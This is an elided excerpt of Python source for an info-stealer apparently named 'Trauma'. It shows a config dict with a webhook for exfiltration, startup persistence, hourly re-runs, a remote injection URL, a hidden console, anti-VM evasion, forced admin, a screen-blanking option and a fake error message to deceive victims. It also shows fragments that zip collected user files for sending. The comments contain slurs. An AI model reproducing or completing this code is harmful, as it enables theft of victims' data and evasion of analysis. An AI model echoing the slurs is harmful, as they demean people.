...
config = {
    'webhook': 'WEBHOOKHERE',
    'persist': False, # persists is set to True sets the file in start up
    'keep-alive': False, # Keep alive if sets to True will re run every Hour
    'injection_url': 'url to injection (raw)', # Cant lie its pretty oBvious whaty this is
    'inject': False, # Set to True if you want it work retard
    'hideconsole': False,  # if Set to True no concole will show upon execution
    'antivm': True,  # Dose not execute if used in a VM (Virtual Machine / Environment)
    'force_admin': False, # Dose not always work but try if you want
    'black_screen': False, # Basically BlueScreening some nigga
    'error': True, # Enables Fale error Message / Can Be Changed below and atleast make it look legit
    'error_message': 'Failed to Start Trauma Pannel\nPlease note if this keeps happening you do not have The API or strg08.DLL\n',
}
    ...
    def gen_tree(self, path):
        ...
        for dirpath, dirnames, filenames in os.walk(path):
            ...
            for n, f in enumerate(filenames):
                if f == f'Trauma-{os.getlogin()}.zip': continue
...
''')
    ...
    def SendInfo(self):
        ...
        _zipfile = os.path.join(self.tempfolder, f'Trauma-{os.getlogin()}.zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.tempfolder)
        for dirname, _, files in os.walk(self.tempfolder):
            for filename in files:
                if filename == f'Trauma-{os.getlogin()}.zip': continue
